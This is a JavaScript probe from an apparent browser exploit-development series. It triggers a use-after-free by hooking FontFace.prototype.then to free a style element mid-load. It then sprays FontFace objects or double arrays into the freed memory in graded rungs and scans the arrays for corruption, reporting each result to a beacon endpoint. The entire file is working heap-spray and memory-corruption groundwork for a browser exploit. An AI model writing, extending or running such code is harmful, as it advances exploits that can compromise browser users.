// p460-sprayladder — isolate what in the getter spray kills the page
// Beacon prefix: V459- (P*- tags)
//
// Established:
//   p457: getter sprays 120 JS FontFaces -> page SURVIVES hundreds of
//         runs; a reoccupying FontFace is safe (its confused dispatch
//         resolves a promise = the flip signature).
//   p459: getter sprays double-arrays -> page DIES every time, even
//         with every element 0.0. The lethal bytes are NOT in the
//         elements: either the butterfly's 8-byte length header at the
//         block start (26,26 — not controllable from JS) or the freed
//         object's tail beyond the butterfly (timer region), or
//         something about allocation-during-getter itself.
//
// This ladder changes ONE variable per rung; p457's exact recipe is the
// known-good control. Rung advances after 2 surviving rounds; a death
// or freeze parks the page (attended: one re-entry per killer, user
// paced, zero reloads, memory stays flat).
//   P0: spray NOTHING (trigger only)              expect SURVIVE
//   P1: 120 FontFaces, p457's exact recipe        expect SURVIVE (+flip data)
//   P2: 1 all-zero array (CAP 26)                 the first question
//   P3: 8 all-zero arrays
//   P4: 64 all-zero arrays
//   P5: 200 all-zero arrays (p459 v1/v2 killer, known)
// Any nonzero element in P2-P5 = the m_status write caught in JS data.
(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V459-' + tag + '&t=' + Date.now(); } catch(e) {}
  }

  var PHASES = ['none', 'ff120', 'arr1', 'arr8', 'arr64', 'arr200'];
  var ARRN = { arr1: 1, arr8: 8, arr64: 64, arr200: 200 };
  var CAP = 26;
  var OK = 'local(Helvetica)';
  var BAD = 'local(Songti)';
  var ROUND_MS = 8000;

  function store(k, v) { try { localStorage.setItem(k, String(v)); } catch(e) {} }

  var ph = 0;
  try { ph = parseInt(localStorage.getItem('p460ph') || '0', 10); } catch(e) {}
  if (!(ph >= 0 && ph < PHASES.length)) ph = 0;

  var ran = 0;
  try { ran = parseInt(localStorage.getItem('p460ran') || '0', 10); } catch(e) {}
  if (ran === 1) {
    // previous phase's round killed or froze the page; this boot is the
    // recovery. Mark, advance, park — exactly one restart per killer.
    B('KILL-' + PHASES[ph]);
    ph = ph + 1;
    if (ph >= PHASES.length) { parkNow('ladder complete'); return; }
    store('p460ph', ph);
    store('p460ran', 0);
    parkNow('killer was ' + PHASES[ph - 1] + ' — back out, re-enter to continue');
    return;
  }

  // loop guard: >10 boots in 10 min = something is chain-restarting
  var boots = 0;
  try {
    var t0 = parseInt(localStorage.getItem('p460bt') || '0', 10);
    var now = Date.now();
    if (now - t0 > 600000) boots = 1;
    else boots = (parseInt(localStorage.getItem('p460bc') || '0', 10) || 0) + 1;
    store('p460bt', now);
    store('p460bc', boots);
  } catch(e) {}
  if (boots > 10) { parkNow('loop guard — ' + boots + ' boots/10min'); return; }

  var hb = document.createElement('pre');
  hb.style.cssText = 'position:fixed;top:8px;left:8px;color:#0f0;background:#000;padding:6px;font:12px monospace;z-index:9';
  document.body.appendChild(hb);

  window.onerror = function(msg) {
    B('ONERROR-' + encodeURIComponent(String(msg)).slice(0, 80));
    return false;
  };

  var stopped = false;
  function parkNow(msg) {
    stopped = true;
    try {
      hb.textContent = 'p460 STOPPED: ' + msg;
      hb.style.color = '#ff0';
    } catch(e) {}
    B('PARK-' + encodeURIComponent(String(msg).slice(0, 60)));
  }

  B('BOOT-P' + ph + '-' + PHASES[ph] + '-b' + boots);

  var arrays = [];
  var jfaces = [];
  var survThisPh = 0;

  Object.defineProperty(FontFace.prototype, 'then', {
    get: function() {
      var v = document.getElementById('v');
      if (v) {
        v.remove();
        document.body.offsetHeight;      // free happens here
        arrays = [];
        jfaces = [];
        var n = ARRN[PHASES[ph]] || 0;
        try {
          if (PHASES[ph].charAt(0) === 'f') {
            for (var k = 0; k < n; k++) {
              var ff = new FontFace('j' + k, BAD);
              document.fonts.add(ff);
              jfaces.push(ff);
            }
          } else {
            for (var i = 0; i < n; i++) {
              var a = new Array(CAP);
              for (var j = 0; j < CAP; j++) a[j] = 0;
              arrays.push(a);
            }
          }
        } catch (e) {
          B('OOMGUARD');
          parkNow('allocation failed — parked before any console error');
          return;
        }
      }
      return undefined;
    },
    configurable: true
  });

  function cleanup() {
    try {
      var st = document.querySelectorAll('style');
      for (var i = 0; i < st.length; i++) st[i].remove();
      document.fonts.forEach(function(f) { try { document.fonts.delete(f); } catch(e) {} });
    } catch(e) {}
    arrays = [];
    jfaces = [];
  }

  function scanArrays() {
    var hits = [], total = 0;
    for (var i = 0; i < arrays.length; i++) {
      var a = arrays[i];
      if (a.length !== CAP) { hits.push('LEN-a' + i + '=' + a.length); total++; continue; }
      for (var j = 0; j < CAP; j++) {
        var v = a[j];
        if (typeof v !== 'number' || v !== 0) {
          if (hits.length < 4) hits.push('a' + i + '-e' + j + '=' + (typeof v === 'number' ? v.toPrecision(17) : typeof v));
          total++;
        }
      }
    }
    return { hits: hits, total: total };
  }

  function findFace(fam) {
    var found = null;
    document.fonts.forEach(function(f) {
      if (f.family.replace(/['"]/g, '') === fam) found = f;
    });
    return found;
  }

  function round() {
    if (stopped) return;
    hb.textContent = 'p460 P' + ph + ' (' + PHASES[ph] + ') round ' + (survThisPh + 1) + '/2';
    B('GO-P' + ph + '-' + PHASES[ph]);
    store('p460ran', 1);                  // dies/freeze here -> next boot marks KILL

    var victim = document.createElement('style');
    victim.id = 'v';
    victim.textContent = 'x{}';
    document.head.appendChild(victim);

    var fs = document.createElement('style');
    fs.textContent = '@font-face { font-family: g0; src: ' + OK + '; }';
    document.head.appendChild(fs);
    document.body.offsetHeight;

    var face = findFace('g0');
    if (!face) {
      B('NOFACE-P' + ph);
      store('p460ran', 0);
      cleanup();
      setTimeout(round, ROUND_MS);
      return;
    }

    void face.loaded;
    face.load().then(
      function() {
        if (stopped) return;
        store('p460ran', 0);

        // array phases: any nonzero element is the write, caught
        if (arrays.length) {
          var r = scanArrays();
          if (r.total > 0) {
            B('MARKER-P' + ph + '-' + r.hits.join('|'));
            hb.textContent = 'p460 CORRUPTION: ' + r.hits.join(' ');
            hb.style.color = '#0ff';
            return;                        // keep arrays alive; stop
          }
        }
        // fontface phase: report flips (p457 parity check)
        if (jfaces.length) {
          var flipped = -1;
          for (var k = 0; k < jfaces.length; k++) {
            var s;
            try { s = jfaces[k].status; } catch(e) { s = 'THROW'; }
            if (s !== 'unloaded') flipped = k;
          }
          B(flipped >= 0 ? 'FLIP-P' + ph + '-' + flipped : 'NOFLIP-P' + ph);
        }

        B('SURV-P' + ph + '-' + PHASES[ph]);
        cleanup();
        survThisPh++;
        if (survThisPh >= 2) {
          survThisPh = 0;
          ph = ph + 1;
          if (ph >= PHASES.length) { parkNow('ladder complete'); return; }
          store('p460ph', ph);
        }
        hb.textContent = 'p460 P' + ph + ' (' + PHASES[ph] + ') clean — next in 8s';
        setTimeout(round, ROUND_MS);
      },
      function() {
        if (stopped) return;
        store('p460ran', 0);
        B('NO0-P' + ph);
        cleanup();
        setTimeout(round, ROUND_MS);
      }
    );
  }

  round();
  // freeze guard: if neither promise callback fires within 30s, the page
  // may be wedged — beacon and mark the phase so the next boot advances.
  // (No reload: reloads are the leak. If the page is truly frozen this
  // timer never fires and the user's re-entry recovers, as p459 showed.)
  setTimeout(function() {
    if (stopped) return;
    B('WATCHDOG-P' + ph + '-' + PHASES[ph]);
  }, 30000);
})();
